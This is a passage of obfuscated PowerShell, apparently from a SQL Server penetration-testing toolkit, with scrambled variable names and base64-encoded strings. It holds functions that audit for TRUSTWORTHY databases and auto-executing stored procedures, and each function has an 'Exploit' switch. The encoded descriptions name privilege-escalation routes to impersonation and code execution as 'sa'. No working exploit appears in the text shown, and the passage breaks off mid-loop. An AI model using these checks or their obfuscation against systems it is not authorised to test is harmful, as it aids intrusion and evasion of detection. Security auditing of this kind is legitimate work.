        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABUAHIAdQBzAHQAZQBkACAARABhAHQAYQBiAGEAcwBlAA==')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAFQAcgB1AHMAdABlAGQAIABEAGEAdABhAGIAYQBzAGUALgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMALgA=')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABUAHIAdQBzAHQAdwBvAHIAdABoAHkAIABEAGEAdABhAGIAYQBzAGUA')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGUAIABvAHIAIABtAG8AcgBlACAAZABhAHQAYQBiAGEAcwBlACAAaQBzACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAGEAcwAgAHQAcgB1AHMAdAB3AG8AcgB0AGgAeQAuACAAIABUAGgAZQAgAFQAUgBVAFMAVABXAE8AUgBUAEgAWQAgAGQAYQB0AGEAYgBhAHMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAGkAcwAgAHUAcwBlAGQAIAB0AG8AIABpAG4AZABpAGMAYQB0AGUAIAB3AGgAZQB0AGgAZQByACAAdABoAGUAIABpAG4AcwB0AGEAbgBjAGUAIABvAGYAIABTAFEATAAgAFMAZQByAHYAZQByACAAdAByAHUAcwB0AHMAIAB0AGgAZQAgAGQAYQB0AGEAYgBhAHMAZQAgAGEAbgBkACAAdABoAGUAIABjAG8AbgB0AGUAbgB0AHMAIAB3AGkAdABoAGkAbgAgAGkAdAAuACAAIABJAG4AYwBsAHUAZABpAG4AZwAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAgAG0AYQBsAGkAYwBpAG8AdQBzACAAYQBzAHMAZQBtAGIAbABpAGUAcwAgAHcAaQB0AGgAIABhAG4AIABFAFgAVABFAFIATgBBAEwAXwBBAEMAQwBFAFMAUwAgAG8AcgAgAFUATgBTAEEARgBFACAAcABlAHIAbQBpAHMAcwBpAG8AbgAgAHMAZQB0AHQAaQBuAGcALgAgAEEAbABzAG8ALAAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAgAG0AYQBsAGkAYwBpAG8AdQBzACAAbQBvAGQAdQBsAGUAcwAgAHQAaABhAHQAIABhAHIAZQAgAGQAZQBmAGkAbgBlAGQAIAB0AG8AIABlAHgAZQBjAHUAdABlACAAYQBzACAAaABpAGcAaAAgAHAAcgBpAHYAaQBsAGUAZwBlAGQAIAB1AHMAZQByAHMALgAgAEMAbwBtAGIAaQBuAGUAZAAgAHcAaQB0AGgAIABvAHQAaABlAHIAIAB3AGUAYQBrACAAYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAaQB0ACAAYwBhAG4AIABsAGUAYQBkACAAdABvACAAdQBzAGUAcgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGEAcgBiAGkAdAByAGEAcgB5ACAAYwBvAGQAZQAgAGUAeABlAGMAdABpAG8AbgAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIALgA=')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAGcAdQByAGUAZAAgAHQAaABlACAAYQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlACAAcwBvACAAdABoAGUAIAAnAGkAcwBfAHQAcgB1AHMAdAB3AG8AcgB0AGgAeQBfAG8AbgAnACAAZgBsAGEAZwAgAGkAcwAgAHMAZQB0ACAAdABvACAAJwBmAGEAbABzAGUAJwAuACAAIABBACAAcQB1AGUAcgB5ACAAcwBpAG0AaQBsAGEAcgAgAHQAbwAgACcAQQBMAFQARQBSACAARABBAFQAQQBCAEEAUwBFACAATQB5AEEAcABwAHMARABiACAAUwBFAFQAIABUAFIAVQBTAFQAVwBPAFIAVABIAFkAIABPAE4AJwAgAGkAcwAgAHUAcwBlAGQAIAB0AG8AIABzAGUAdAAgAGEAIABkAGEAdABhAGIAYQBzAGUAIABhAHMAIAB0AHIAdQBzAHQAdwBvAHIAdABoAHkALgAgACAAQQAgAHEAdQBlAHIAeQAgAHMAaQBtAGkAbABhAHIAIAB0AG8AIAAnAEEATABUAEUAUgAgAEQAQQBUAEEAQgBBAFMARQAgAE0AeQBBAHAAcABEAGIAIABTAEUAVAAgAFQAUgBVAFMAVABXAE8AUgBUAEgAWQAgAE8ARgBGACcAIABjAGEAbgAgAGIAZQAgAHUAcwBlACAAdABvACAAdQBuAHMAZQB0ACAAaQB0AC4A')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgANwA4ADYAMQAuAGEAcwBwAHgA')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${_/=\/=\_/====\___} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.DatabaseName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAYgA='))) -and $_.is_trustworthy_on -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA=')))
        }
        if(${_/=\/=\_/====\___})
        {
            ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${_/=\/=\_/====\___} |
            % -Process {
                $DatabaseName = $_.DatabaseName
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAZABhAHQAYQBiAGEAcwBlACAAJABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAgAHcAYQBzACAAZgBvAHUAbgBkACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAGEAcwAgAHQAcgB1AHMAdAB3AG8AcgB0AGgAeQAuAA==')))
                ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABkAGEAdABhAGIAYQBzAGUAIAAkAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlACAAdwBhAHMAIABmAG8AdQBuAGQAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAYQBzACAAdAByAHUAcwB0AHcAbwByAHQAaAB5AC4A')))
                $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
            }
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAG4AbwBuAC0AZABlAGYAYQB1AGwAdAAgAHQAcgB1AHMAdABlAGQAIABkAGEAdABhAGIAYQBzAGUAcwAgAHcAZQByAGUAIABmAG8AdQBuAGQALgA=')))
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAFQAcgB1AHMAdABlAGQAIABEAGEAdABhAGIAYQBzAGUA')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function  Invoke-SQLAuditPrivAutoExecSp
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${__/====\/=\/=\/=\} = new-object System.Data.DataTable 
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEATgBhAG0AZQA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAGQAdQByAGUAVAB5AHAAZQA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAGQAdQByAGUARABlAGYAaQBuAGkAdABpAG8AbgA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAXwBEAEEAVABBAF8AQQBDAEMARQBTAFMA')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBPAFUAVABJAE4ARQBfAEIATwBEAFkA')))) | Out-Null    
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUARAA=')))) | Out-Null         
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABBAFMAVABfAEEATABUAEUAUgBFAEQA')))) | Out-Null    
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AbQBzAF8AcwBoAGkAcABwAGUAZAA=')))) | Out-Null   
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AYQB1AHQAbwBfAGUAeABlAGMAdQB0AGUAZAA=')))) | Out-Null 
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBpAHMAcwBpAG8AbgBOAGEAbQBlAA==')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBpAHMAcwBpAG8AbgBUAHkAcABlAA==')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA=')))) | Out-Null
        ${__/====\/=\/=\/=\}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) | Out-Null
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABBAHUAdABvACAARQB4AGUAYwB1AHQAZQAgAFMAdABvAHIAZQBkACAAUAByAG8AYwBlAGQAdQByAGUA')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAEEAdQB0AG8AIABFAHgAZQBjAHUAdABlACAAUwB0AG8AcgBlAGQAIABQAHIAbwBjAGUAZAB1AHIAZQAuAA==')))
            Return
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABBAHUAdABvACAARQB4AGUAYwB1AHQAZQAgAFMAdABvAHIAZQBkACAAUAByAG8AYwBlAGQAdQByAGUA')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAZAAgAGkAcwAgAGMAbwBuAGYAaQBnAHUAcgBlAGQAIABmAG8AcgAgAGEAdQB0AG8AbQBhAHQAaQBjACAAZQB4AGUAYwB1AHQAaQBvAG4AIABhAG4AZAAgAGgAYQBzACAAZQB4AHAAbABpAGMAaQB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAYQBzAHMAaQBnAG4AZQBkAC4AIAAgAFQAaABpAHMAIABtAGEAeQAgAGEAbABsAG8AdwAgAG4AbwBuACAAcwB5AHMAYQBkAG0AaQBuACAAbABvAGcAaQBuAHMAIAB0AG8AIABlAHgAZQBjAHUAdABlACAAcQB1AGUAcgBpAGUAcwAgAGEAcwAgACIAcwBhACIAIAB3AGgAZQBuACAAdABoAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAcwBlAHIAdgBpAGMAZQAgAGkAcwAgAHIAZQBzAHQAYQByAHQAZQBkAC4A')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIAB0AGgAYQB0ACAAbgBvAG4AIABzAHkAcwBhAGQAbQBpAG4AIABsAG8AZwBpAG4AcwAgAGQAbwAgAG4AbwB0ACAAaABhAHYAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABBAEwAVABFAFIAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAdwBpAHQAaAAgAHQAaABlACAAaQBzAF8AYQB1AHQAbwBfAGUAeABlAGMAdQB0AGUAZAAgAHMAZQB0AHQAdABpAG4AZwAgAHMAZQB0ACAAdABvACAAMQAuAA==')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgANwA4ADYAMQAuAGEAcwBwAHgA')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
        ${____/=\/\_/=\/\/\} = Get-SQLStoredProcedureAutoExec -Verbose -Instance $Instance -Username $username -Password $password -Credential $credential 
        ${_/\/\/\/\/==\/=\_} = ${____/=\/\_/=\/\/\} | measure | select count -ExpandProperty count
        if(${_/\/\/\/\/==\/=\_} -eq 0){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAdwBlAHIAZQAgAGYAbwB1AG4AZAAgAGMAbwBuAGYAaQBnAHUAcgBlAGQAIAB0AG8AIABhAHUAdABvACAAZQB4AGUAYwB1AHQAZQAuAA==')))
            return
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBoAGUAYwBrAGkAbgBnACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzAC4ALgAuAA==')))
        ${____/=\/\_/=\/\/\} | 
        foreach-object {
            $ComputerName = $_.ComputerName
            $Instance = $_.Instance
            $DatabaseName = $_.DatabaseName
            $SchemaName = $_.SchemaName
            $ProcedureName = $_.ProcedureName
            ${/=\/\__/\____/\/\} = $_.ProcedureType
            ${__/=\/\/======\_/} = $_.ProcedureDefinition
            ${_/=\_/=====\/\_/=} = $_.SQL_DATA_ACCESS
            ${_/\/=\/\_/\/==\/\} = $_.ROUTINE_BODY
            ${/=\_/=\___/\_/\/\} = $_.CREATED
            ${_/=\___/\/\/\_/\/} = $_.LAST_ALTERED
            ${/=\_/==\_/\___/=\} = $_.is_ms_shipped
            ${___/\/=\__/\/=\__} = $_.is_auto_executed    
